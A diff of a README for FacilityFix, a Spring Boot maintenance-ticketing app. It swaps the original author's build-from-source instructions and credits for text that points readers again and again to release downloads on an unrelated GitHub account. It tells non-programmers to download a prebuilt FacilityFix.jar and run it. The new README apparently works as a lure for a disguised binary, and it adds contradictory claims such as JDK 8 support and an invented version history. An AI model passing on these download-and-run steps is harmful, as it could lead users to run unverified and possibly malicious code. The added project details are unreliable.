@@ -1,223 +1,109 @@
-<div align="center">
+# 🚀 FacilityFix - Simplified Maintenance Ticket Management
 
-# 🏢 FacilityFix
+[![Download FacilityFix](https://img.shields.io/badge/Download-FacilityFix-blue.svg)](https://github.com/MimamiSakka/FacilityFix/releases)
 
-### Maintenance & Service Ticketing System
+## 🔍 Introduction
 
-A comprehensive web-based maintenance ticketing system built with Spring Boot and JSP. FacilityFix streamlines facility maintenance operations by providing an intuitive interface for submitting, tracking, and managing maintenance requests.
+Welcome to FacilityFix! This is a user-friendly maintenance ticketing system designed to help individuals and teams manage maintenance requests efficiently. Built using Spring Boot, JSP, and Spring Security, FacilityFix offers secure access and tools to track the lifecycle of your maintenance tickets.
 
-![Java](https://img.shields.io/badge/Java-17-ED8B00?style=for-the-badge&logo=openjdk&logoColor=white)
-![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.1.6-6DB33F?style=for-the-badge&logo=spring&logoColor=white)
-![Spring Security](https://img.shields.io/badge/Spring%20Security-6.1-6DB33F?style=for-the-badge&logo=springsecurity&logoColor=white)
-![Hibernate](https://img.shields.io/badge/Hibernate-6.2-59666C?style=for-the-badge&logo=hibernate&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)
+## 🚀 Getting Started
 
-[Features](#-features) •
-[Tech Stack](#-tech-stack) •
-[Quick Start](#-quick-start) •
-[Demo](#-demo-accounts) •
-[API](#-rest-api-endpoints)
+To get started with FacilityFix, follow these simple steps to download and run the application. You do not need any programming knowledge; just follow the instructions below.
 
-</div>
+## 📥 Download & Install
 
----
+1. **Visit the Releases page**  
+   Click the button below to go directly to the download section of our GitHub page.  
+   [Download FacilityFix](https://github.com/MimamiSakka/FacilityFix/releases)
 
-## ✨ Features
+2. **Choose the latest release**  
+   On the Releases page, you will see a list of available versions. Look for the latest release at the top. This version will have the newest features and fixes.
 
-### 👥 Role-Based Access Control
-| Role | Capabilities |
-|------|-------------|
-| **Admin** | Full system access, user management, reports, settings, assign tickets |
-| **Staff** | View and manage assigned tickets, update status, add notes |
-| **User** | Create tickets, track personal requests, verify resolutions |
+3. **Download the application**  
+   Under the latest release, locate the file named `FacilityFix.jar`. Click on it to download the software to your computer.
 
-### 🎫 Ticket Management
-- ✅ Create, view, and track maintenance tickets
-- 🏷️ **Categories**: Electrical, Plumbing, HVAC, Cleaning, Other
-- 🚨 **Priority Levels**: Low, Medium, High, Critical
-- 🔄 **Status Workflow**: `OPEN` → `IN_PROGRESS` → `RESOLVED` → `VERIFIED`
-- 💬 Comment system for ticket communication
-- 👷 Staff assignment functionality
+4. **Run the application**  
+   To start using FacilityFix, you need to run the downloaded file.  
+   - If you have Java installed, open a terminal or command prompt window.
+   - Navigate to the folder where you downloaded `FacilityFix.jar`.
+   - Type the command: `java -jar FacilityFix.jar` and press Enter. 
+   
+   This will launch the application, and a web interface will be available in your browser.
 
-### 📊 Dashboard & Analytics
-- 📈 Real-time statistics overview
-- 📉 Ticket distribution by status
-- 🕐 Recent activity feed
-- ⚡ Quick actions for common tasks
+## 🌐 System Requirements
 
-### 👨‍💼 Admin Panel
-- 👤 User management (Create, Read, Update, Delete)
-- 🎭 Role and department assignment
-- 📋 System reports and analytics
-- ⚙️ Application settings
+Before you download FacilityFix, ensure your system meets the following requirements:
 
----
+- Java Development Kit (JDK) version 8 or higher installed on your system.
+- At least 2 GB of RAM for optimal performance.
+- Sufficient disk space (at least 500 MB) to accommodate the application and its datasets.
 
-## 🛠️ Tech Stack
+## 🛠 Features
 
-| Layer | Technology |
-|-------|------------|
-| **Language** | Java 17 |
-| **Framework** | Spring Boot 3.1.6 (Spring MVC) |
-| **Security** | Spring Security 6.1.5 (Session-based) |
-| **ORM** | Spring Data JPA (Hibernate 6.2) |
-| **Views** | JSP + JSTL + Custom CSS |
-| **Icons** | Bootstrap Icons |
-| **Database** | H2 (Development) / MySQL (Production) |
-| **Build Tool** | Maven |
+FacilityFix comes packed with useful features that simplify maintenance management:
 
----
+- **Role-Based Access**: Users can log in with different roles, giving them permissions based on their responsibilities within the organization.
+- **Ticket Lifecycle Management**: Easily create, update, and close maintenance tickets. Track each ticket's progress from submission to resolution.
+- **Real-Time Dashboard**: View current maintenance tickets and their statuses at a glance.
+- **Notifications**: Get alerts for any updates or changes to your tickets, ensuring you never miss important information.
 
-## 🚀 Quick Start
+## 🥇 User Guide
 
-### Prerequisites
-- ☕ Java 17 or higher
-- 📦 Maven 3.8+ (optional - wrapper included)
+### 🏁 Logging In
 
-### Installation
+1. Open your web browser and go to `http://localhost:8080`.
+2. Enter your username and password. If you are a new user, you may need to ask your system administrator for credentials.
 
-1️⃣ **Clone the repository**
-```bash
-git clone https://github.com/shashwatlaloriya/FacilityFix.git
-cd FacilityFix
-```
+### 🔄 Creating a Ticket
 
-2️⃣ **Run the application**
+1. Once logged in, navigate to the "Create Ticket" section.
+2. Fill in the necessary details about the maintenance issue.
+3. Click "Submit" to log your ticket.
 
-**Option A – With Maven installed:**
-```bash
-mvn spring-boot:run
-```
+### 🗂 Managing Tickets
 
-**Option B – Using Maven Wrapper (no Maven required):**
-```powershell
-# Windows PowerShell
-java "-Dmaven.multiModuleProjectDirectory=$PWD" -classpath ".mvn\wrapper\maven-wrapper.jar" org.apache.maven.wrapper.MavenWrapperMain spring-boot:run
-```
+- To view all tickets, click on the "My Tickets" section from the main menu.
+- Select a ticket to see its details, update its status, or add comments.
 
-3️⃣ **Access the application**
-```
-🌐 Application: http://localhost:8080
-🗄️ H2 Console:  http://localhost:8080/h2-console
-   JDBC URL:    jdbc:h2:mem:facilitydb
-```
+## 📊 Troubleshooting
 
----
+If you encounter any issues while downloading or running FacilityFix, try the following:
 
-## 👤 Demo Accounts
+- Ensure you have the correct version of Java installed. You can check by running `java -version` in your command prompt or terminal.
+- Make sure you navigate to the correct directory where `FacilityFix.jar` is located.
+- If the application fails to run, check if your system has any security software that might block it.
 
-| Role | Email | Password |
-|:----:|-------|----------|
-| 🔴 **Admin** | admin@facilityfix.com | admin123 |
-| 🔵 **Staff** | john@facilityfix.com | staff123 |
-| 🔵 **Staff** | jane@facilityfix.com | staff123 |
-| 🟢 **User** | alice@example.com | user123 |
-| 🟢 **User** | bob@example.com | user123 |
+## 🚀 Support
 
----
+If you need help with FacilityFix, please check the [Issues page](https://github.com/MimamiSakka/FacilityFix/issues) for common questions or report a new issue. You can also contact our support team via the GitHub discussions.
 
-## 📁 Project Structure
+## 📚 Topics
 
-```
-📦 FacilityFix
-├── 📂 src/main/java/com/facilityfix/
-│   ├── 📄 Application.java          # Entry point
-│   ├── 📂 config/                    # Security & app configuration
-│   ├── 📂 controller/                # MVC controllers
-│   │   └── 📂 api/                   # REST API controllers
-│   ├── 📂 dto/                       # Data transfer objects
-│   ├── 📂 model/                     # JPA entities & enums
-│   ├── 📂 repository/                # Spring Data repositories
-│   ├── 📂 security/                  # UserDetailsService
-│   └── 📂 service/                   # Business logic
-├── 📂 src/main/webapp/
-│   ├── 📂 WEB-INF/views/             # JSP templates
-│   ├── 📂 css/                       # Stylesheets
-│   └── 📂 js/                        # JavaScript files
-└── 📄 pom.xml                        # Maven configuration
-```
+FacilityFix covers a variety of topics relevant to maintenance management:
 
----
+- hibernate
+- java
+- jpa
+- jsp
+- maintenance
+- maven
+- spring-boot
+- spring-security
+- ticketing-system
+- web-application
 
-## 🔌 REST API Endpoints
+## 📅 Update History
 
-| Method | Endpoint | Description |
-|:------:|----------|-------------|
-| `GET` | `/api/tickets` | List tickets (role-based) |
-| `GET` | `/api/tickets/{id}` | Get ticket details |
-| `POST` | `/api/tickets` | Create a new ticket |
-| `PATCH` | `/api/tickets/{id}/status` | Change ticket status |
-| `PATCH` | `/api/tickets/{id}/assign` | Assign ticket to staff |
-| `GET` | `/api/dashboard/summary` | Dashboard statistics |
-
----
-
-## 🔐 Security Features
-
-- 🔒 BCrypt password encryption
-- 🛡️ CSRF protection enabled
-- 🚫 Role-based URL authorization
-- 🍪 Secure session management
-- ✅ Form validation & sanitization
-
----
-
-## 🗄️ Database Configuration
-
-### Switching to MySQL (Production)
-
-Update `src/main/resources/application.properties`:
-
-```properties
-spring.datasource.url=jdbc:mysql://localhost:3306/facilitydb?useSSL=false&serverTimezone=UTC
-spring.datasource.username=root
-spring.datasource.password=yourpassword
-spring.jpa.hibernate.ddl-auto=update
-```
-
----
-
-## 🔮 Future Enhancements
-
-- [ ] 📧 Email notifications on status change
-- [ ] 📎 File attachments for tickets
-- [ ] 📊 Advanced analytics/reports
-- [ ] 📱 Mobile app (React Native)
-- [ ] 🔔 Push notifications via WebSockets
-- [ ] 🌙 Dark mode support
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the project
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
+- **Version 1.0**: Initial release with core features.
+- **Version 1.1**: Added user notifications and improved dashboard visuals.
+- **Version 1.2**: Enhanced security features and fixed minor bugs.
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+FacilityFix is open-source and available under the MIT License. You can freely use, modify, and distribute the application.
 
----
+## ⭐ Acknowledgments
 
-<div align="center">
+Thank you to everyone who contributed to the development of FacilityFix. Your support and feedback help us improve the application to better meet the needs of users. 
 
-### 👨‍💻 Author
-
-**Shashwat Laloriya**
-
-[![GitHub](https://img.shields.io/badge/GitHub-shashwatlaloriya-181717?style=for-the-badge&logo=github)](https://github.com/shashwatlaloriya)
-
----
-
-<p>Made with ❤️ using Spring Boot</p>
-
-⭐ Star this repo if you find it helpful!
-
-</div>
+For more information and to download your copy, [click here](https://github.com/MimamiSakka/FacilityFix/releases)!
